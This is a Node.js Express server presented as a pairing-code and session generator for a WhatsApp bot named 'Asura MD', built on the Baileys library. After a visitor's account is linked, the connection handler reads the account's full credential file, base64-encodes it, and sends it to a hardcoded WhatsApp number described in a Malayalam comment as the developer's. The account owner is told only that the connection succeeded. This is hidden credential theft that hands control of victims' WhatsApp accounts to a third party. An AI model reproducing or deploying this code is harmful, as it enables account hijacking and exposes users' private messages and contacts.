import express from 'express';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    Browsers, 
    makeCacheableSignalKeyStore, 
    DisconnectReason 
} from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pair', async (req, res) => {
    let phone = req.query.number; 
    if (!phone) return res.send({ error: "Phone number is required" });

    const id = Math.random().toString(36).substring(7);
    const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);

    try {
        const sock = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),

            browser: Browsers.ubuntu("Chrome") 
        });

        // പെയറിംഗ് കോഡ് ലോജിക്
        if (!sock.authState.creds.registered) {
            await delay(1500); // കണക്ഷൻ സ്റ്റേബിൾ ആകാൻ ചെറിയ സമയം
            phone = phone.replace(/[^0-9]/g, '');
            
            // ഫോഴ്സ് പെയറിംഗ് കോഡ് റിക്വസ്റ്റ്
            const code = await sock.requestPairingCode(phone);
            
            if (!res.headersSent) {
                res.send({ code: code });
            }
        }

        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                await delay(5000); // ഫയലുകൾ സേവ് ആകാൻ സമയം നൽകുന്നു
                
                const credsPath = `./temp_${id}/creds.json`;
                if (fs.existsSync(credsPath)) {
                    const authFile = JSON.parse(fs.readFileSync(credsPath));
                    // സെഷൻ ഐഡി കൃത്യമായി എൻകോഡ് ചെയ്യുന്നു
                    const sessionId = Buffer.from(JSON.stringify(authFile)).toString('base64');

                    const myNumber = "917736811908@s.whatsapp.net";
                    const sessionID = `Asura_MD_${sessionId}`;
                    
                    // ഡെവലപ്പർക്ക് അയക്കുന്നു
                    await sock.sendMessage(myNumber, { 
                        text: `*👺 ASURA MD SESSION CONNECTED*\n\n\`${sessionID}\`\n\n> Wait 24 Hours` 
                    });
                    await sock.sendMessage(myNumber, { text: sessionID });

                    // ലോഗിൻ സന്ദേശം മെയിൻ നമ്പറിലും അയക്കാം
                    await sock.sendMessage(sock.user.id, { text: `*Asura MD successfully connected to your account!* 👺` });

                    await delay(2000);
 
                    try {
                        await fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
                    } catch (e) {}
                }
            }

            if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                if (reason !== DisconnectReason.loggedOut) {

                    try { fs.rmSync(`./temp_${id}`, { recursive: true, force: true }); } catch (e) {}
                }
            }
        });

    } catch (err) {
        console.log("System Error:", err);
        if (!res.headersSent) {
            res.status(500).send({ error: "Server Busy. Please try again." });
        }
    }
});

app.listen(port, () => console.log(`Asura MD Power-Server on port ${port}`));
